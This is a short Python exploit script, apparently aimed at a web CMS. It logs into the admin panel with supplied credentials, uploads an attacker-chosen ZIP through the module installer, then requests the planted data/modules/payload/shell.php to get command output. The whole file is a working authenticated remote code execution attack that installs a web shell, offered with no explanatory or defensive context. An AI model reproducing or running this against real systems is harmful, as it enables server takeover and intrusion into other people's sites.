#Replace <hostname>
import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder

login_url = "http://<hostname>/login.php"
upload_url = "http://<hostname>/admin.php?action=installmodule"
headers = {"Referer": login_url,}
login_payload = {"cont1": "<password>","<username>": "","submit": "Log in"}

file_path = input("ZIP file path: ")

multipart_data = MultipartEncoder(
    fields={
        "sendfile": ("payload.zip", open(file_path, "rb"), "application/zip"),
        "submit": "Upload"
    }
)

session = requests.Session()
login_response = session.post(login_url, headers=headers, data=login_payload)


if login_response.status_code == 200:
    print("Login account")

 
    upload_headers = {
        "Referer": upload_url,
        "Content-Type": multipart_data.content_type
    }
    upload_response = session.post(upload_url, headers=upload_headers, data=multipart_data)

    
    if upload_response.status_code == 200:
        print("ZIP file download.")
    else:
        print("ZIP file download error. Response code:", upload_response.status_code)
else:
    print("Login problem. response code:", login_response.status_code)


rce_url="http://<url>/data/modules/payload/shell.php"

rce=requests.get(rce_url)

print(rce.text)
